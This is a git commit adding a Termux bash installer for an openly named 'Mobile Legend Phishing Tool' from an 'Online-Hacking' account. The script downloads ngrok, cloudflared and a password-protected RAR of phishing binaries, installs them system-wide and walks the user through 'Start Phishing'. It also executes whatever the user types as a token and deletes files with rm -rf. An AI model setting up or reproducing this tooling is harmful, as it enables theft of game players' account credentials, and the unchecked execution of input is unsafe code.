6e3871fbddb230ec5ac7c0cfc88cc0cef474e8fa
SUMAM MONDAL <63942767+Online-Hacking@users.noreply.github.com>
2022-02-07 17:08:52 +0530

    Update and rename Android.sh to Android-Setup.sh

---
+++ OnlineHacking/SUMAN/Mobile_Legend/SM/Files/Android-Setup.sh
@@ -0,0 +1,197 @@
+#!/bin/bash
+echo ""
+clear
+echo ""
+echo -e ""
+echo ""
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m  !!          Follow Step by Step         !!\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ---------------------------------------- \e[1;91m\e[0m'
+echo ""
+echo ""
+echo ""
+echo ""
+echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m Use All Step Install Working \e[0m"
+echo ""
+echo ""
+echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 1 :\e[0m\e[1;36m Play Install & Use Video  "
+echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 2 :\e[0m\e[1;36m Enter Activation Key  "
+echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 3 :\e[0m\e[1;36m Download Requirement "
+echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 4 :\e[0m\e[1;36m Install Ngrok  "
+echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 5 :\e[0m\e[1;36m Download Tool File  "
+echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 6 :\e[0m\e[1;36m Enter The Ngrok Token  "
+echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 7 :\e[0m\e[1;36m Start Phishing  "
+echo ""
+rm -rf /data/data/com.termux/files/usr/bin/.SUMAN/1-Skin-Diamonds
+rm -rf /data/data/com.termux/files/usr/bin/.SUMAN/2-Event-Red
+rm -rf /data/data/com.termux/files/usr/bin/.SUMAN/3-Event-Blue
+rm -rf /data/data/com.termux/files/usr/bin/OnlineHacking/LOGO.sh
+rm -rf /data/data/com.termux/files/usr/bin/OnlineHacking/LOGO2.sh
+rm -rf /data/data/com.termux/files/usr/bin/MobileLegend-Phishing
+rm -rf /data/data/com.termux/files/usr/bin/ngrok
+rm -rf /data/data/com.termux/files/usr/bin/cloudflared
+sleep 5
+clear
+echo ""
+echo ""
+echo -e "\e[1m \e[36m[+] There Mobile Legend Phishing Tool Script for Android \e[m \e[21"
+echo ""
+echo ""
+echo ""
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m  !!       Welcome to Online HacKing      !!\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ---------------------------------------- \e[1;91m\e[0m'
+echo ""
+echo -e ""
+echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m How To Install And Use This Tool Play Video \e[0m"
+echo ""
+echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Video Link :\e[0m\e[1;36m Enter now  "
+echo ""
+echo ""
+echo ""
+read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Video Watching Complete ? \e[1;91m (Y/N) : \e[0m' option
+echo""
+echo""
+echo""
+if [[ $option == *'N'* ]]; then
+clear
+exit
+fi
+if [[ $option == *'n'* ]]; then
+clear
+exit
+fi
+echo ""
+termux-open-url https://www.onlinehacking.xyz/2021/07/MobileLegend-Phishing-Hack-Termux.html
+echo ""
+clear
+echo ""
+echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m Installing The Mobile Legend Phishing Tool Please Wait....  \e[0m"
+echo -e ""
+echo ""
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
+echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!             KEY REQUIREMENTS         !!\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ---------------------------------------- \e[1;91m\e[0m'
+echo ""
+echo -e ""
+echo -e "\e[33m
+      ██╗  ██╗███████╗██╗   ██╗
+      ██║ ██╔╝██╔════╝╚██╗ ██╔╝
+      █████╔╝ █████╗   ╚████╔╝
+      ██╔═██╗ ██╔══╝    ╚██╔╝
+      ██║  ██╗███████╗   ██║
+      ╚═╝  ╚═╝╚══════╝   ╚═╝    \e[0m\n"
+echo ""
+echo ""
+echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m Visit This Shot Link and Copy Activation Key \e[0m"
+echo ""
+echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Link :\e[0m\e[1;36m https://bit.ly/3zKZZ8B  "
+echo ""
+echo ""
+read -p $' \e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Enter Activation Key : \e[0m' option
+echo""
+echo""
+echo""
+if [[ $option == *''* ]]; then
+clear
+echo ""
+echo ""
+echo -e "\e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m Installing The Mobile Legend Phishing Tool Please Wait....  \e[0m"
+echo ""
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
+echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!         DOWNLOAD REQUIREMENTS         !!\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
+echo ""
+echo -e "\e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m Onine Hacking \e[0m"
+echo ""
+termux-setup-storage
+apt install apache2 -y 
+apt install ruby -y
+apt install php -y
+apt install jq -y
+apt install tail -y
+apt install curl -y
+apt install zip -y
+apt install unrar -y
+pkg install wget -y
+pkg install ruby -y
+pkg install gem -y
+gem install lolcat
+clear
+echo""
+echo ""
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
+echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!         Download Link Services         !!\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
+echo ""
+wget -q --show-progress https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/Ngrok/Ngrok%20Old/ngrok -O ngrok
+wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
+echo""
+clear
+echo ""
+echo ""
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
+echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!          DOWNLOAD TOOL FILE          !!\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
+echo ""
+wget -q --show-progress https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/OnlineHacking/SUMAN/Mobile_Legend/SM/SUMAN.rar -O SUMAN.rar
+unrar x -Password SUMAN.rar
+rm -rf SUMAN.rar
+chmod +x ngrok
+chmod +x cloudflared
+chmod +x ML
+chmod +x MobileLegend
+clear
+echo ""
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
+echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!        Requirement Ngrok Token       !!\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
+echo ""
+echo""
+echo -e "\e[31m[\e[32m*\e[31m]\e[33m Visit \e[32mngrok.com \e[m "
+echo ""
+echo -e "\e[31m[\e[32m*\e[31m]\e[33m Sign up & get ngrok authtoken \e[m "
+echo ""
+sleep 1
+echo ""
+read -p $'\e[31m[\e[32m*\e[31m]\e[33m Enter The Ngrok Token [Ex. ./ngrok authtoken 1Y7IU ] : \e[0m' token
+$token
+echo ""
+echo
+cp -R cloudflared ngrok .SUMAN/1-Skin-Diamonds/
+cp -R cloudflared ngrok .SUMAN/2-Event-Red/
+cp -R cloudflared ngrok .SUMAN/3-Event-Blue/
+chmod 7777 MobileLegend-Phishing
+clear
+echo
+echo
+cp -R ngrok /data/data/com.termux/files/usr/bin
+cp -R cloudflared /data/data/com.termux/files/usr/bin
+cp -R .SUMAN /data/data/com.termux/files/usr/bin
+cp -R ML /data/data/com.termux/files/usr/bin
+cp -R MobileLegend /data/data/com.termux/files/usr/bin
+cp -R MobileLegend-Phishing /data/data/com.termux/files/usr/bin
+cp -R OnlineHacking /data/data/com.termux/files/usr/bin
+echo
+rm -rf .SUMAN 
+echo
+echo -e "\e[35m[+] Connect Online Hacking Mobile Legend Hacking Server......  \e[m "
+sleep 2
+echo
+echo
+clear
+echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;92m  ---------------------------------   \e[1;91m\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m !!    Installation Successfull   !!  \e[1;91m\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;92m  ---------------------------------   \e[1;91m\e[0m'
+sleep 4
+echo
+echo -e "\e[1m \e[36m[+] There Mobile Legend Phishing Tool Ready \e[m \e[21"
+echo
+echo
+echo -e "\e[92m[+] Open New type this command:\e[93m MobileLegend-Phishing \e[m "
+echo
+fi
+sleep 3
+echo
+rm -rf Android-Setup.sh
+exit
